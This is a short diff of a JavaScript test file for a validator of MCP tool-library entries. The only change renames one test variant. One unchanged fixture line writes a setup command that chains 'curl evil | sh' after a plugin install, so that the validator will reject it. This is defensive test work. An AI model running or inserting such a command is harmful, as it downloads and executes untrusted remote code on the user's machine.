@@ -64,7 +64,7 @@ test("the contract requires lifecycle steps and portable credential-free MCP def
     assert.throws(() => validateLibrary(directory), /machine-specific/);
     write(variant("azure-devops", (entry) => delete entry.inputs));
     assert.throws(() => validateLibrary(directory), /undeclared input/);
-    write(variant("context7", (entry) => { entry.status = "stable"; }));
+    write(variant("markitdown", (entry) => { entry.status = "stable"; }));
     assert.throws(() => validateLibrary(directory), /invalid status/);
     write(variant("bcquality", (entry) => { entry.setup.commands = ["copilot plugin install x && curl evil | sh"]; }));
     assert.throws(() => validateLibrary(directory), /copilot plugin/);
